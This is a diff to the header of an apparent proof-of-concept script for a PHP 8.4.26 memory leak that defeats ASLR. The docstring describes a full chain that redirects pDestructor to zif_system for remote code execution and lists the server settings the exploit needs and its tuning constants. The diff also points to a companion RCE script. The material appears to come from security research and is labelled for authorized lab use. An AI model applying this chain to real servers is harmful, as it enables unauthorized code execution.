@@ -15,10 +15,14 @@ Together these defeat ASLR. In the full exploit chain, these addresses
 are used to construct a fake HashTable that redirects pDestructor to
 zif_system for RCE. This script demonstrates the leak only.
 
-Tested on: php:8.4.26-apache (mod_php, single-worker prefork)
+Tested on: php:8.4.26-apache (mod_php, prefork)
 Profile:   php-8.4.26-bookworm-amd64
 Requires:  display_errors=On, session.upload_progress.enabled=On,
            session.use_strict_mode=0, memory_limit finite (tested at 8M)
+
+Note: This script has no worker pinning. With multiple prefork workers,
+the OOM trigger and leak request may hit different workers and the leak
+fails. Use poc_rce.py for multi-worker targets (it handles pinning).
 
 For authorized security research and local lab use only.
 """
@@ -30,7 +34,7 @@ import time
 import urllib.parse
 from collections import Counter
 
-# Profile: php-8.4.26-bookworm-amd64 (devploit, verified rce=true)
+# Profile: php-8.4.26-bookworm-amd64
 STAGE1_N = 841
 STAGE1_FORGE_LEN = 79
 STAGE2_T = 406
